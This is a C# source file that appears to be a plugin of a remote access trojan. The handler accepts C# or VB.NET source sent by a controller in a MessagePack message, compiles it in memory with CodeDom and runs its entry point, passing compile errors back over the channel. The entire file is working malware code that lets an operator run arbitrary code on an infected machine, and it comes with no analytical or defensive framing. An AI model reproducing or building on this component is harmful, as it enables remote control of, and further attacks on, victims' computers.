using Microsoft.CSharp;
using Microsoft.VisualBasic;
using Plugin;
using MessagePackLib.MessagePack;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Text;

namespace Miscellaneous.Handler
{
    public class HandlerExecuteDotNetCode
    {
        private Dictionary<string, string> providerOptions = new Dictionary<string, string>() {
                {"CompilerVersion", "v4.0" }
            };

        public HandlerExecuteDotNetCode(MsgPack unpack_msgpack)
        {
            switch (unpack_msgpack.ForcePathObject("Option").AsString)
            {
                case "C#":
                    {
                        Compiler(new CSharpCodeProvider(providerOptions), unpack_msgpack.ForcePathObject("Code").AsString, unpack_msgpack.ForcePathObject("Reference").AsString.Split(new string[] { "," }, StringSplitOptions.RemoveEmptyEntries));
                        break;
                    }

                case "VB.NET":
                    {
                        Compiler(new VBCodeProvider(providerOptions), unpack_msgpack.ForcePathObject("Code").AsString, unpack_msgpack.ForcePathObject("Reference").AsString.Split(new string[] { "," }, StringSplitOptions.RemoveEmptyEntries));
                        break;
                    }
            }
        }

        public void Compiler(CodeDomProvider codeDomProvider, string source, string[] referencedAssemblies)
        {
            try
            {
                var providerOptions = new Dictionary<string, string>() {
                {"CompilerVersion", "v4.0" }
            };

                var compilerOptions = "/target:winexe /platform:anycpu /optimize-";

                var compilerParameters = new CompilerParameters(referencedAssemblies)
                {
                    GenerateExecutable = true,
                    GenerateInMemory = true,
                    CompilerOptions = compilerOptions,
                    TreatWarningsAsErrors = false,
                    IncludeDebugInformation = false,
                };
                var compilerResults = codeDomProvider.CompileAssemblyFromSource(compilerParameters, source);

                if (compilerResults.Errors.Count > 0)
                {
                    foreach (CompilerError compilerError in compilerResults.Errors)
                    {
                        Debug.WriteLine(string.Format("{0}\nLine: {1} - Column: {2}\nFile: {3}", compilerError.ErrorText,
                            compilerError.Line, compilerError.Column, compilerError.FileName));
                        Packet.Error(string.Format("{0}\nLine: {1}", compilerError.ErrorText,
                            compilerError.Line));
                        break;
                    }
                }
                else
                {
                    Assembly assembly = compilerResults.CompiledAssembly;
                    MethodInfo methodInfo = assembly.EntryPoint;
                    object injObj = assembly.CreateInstance(methodInfo.Name);
                    object[] parameters = new object[1];
                    if (methodInfo.GetParameters().Length == 0)
                    {
                        parameters = null;
                    }
                    methodInfo.Invoke(injObj, parameters);
                }
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }
    }

}
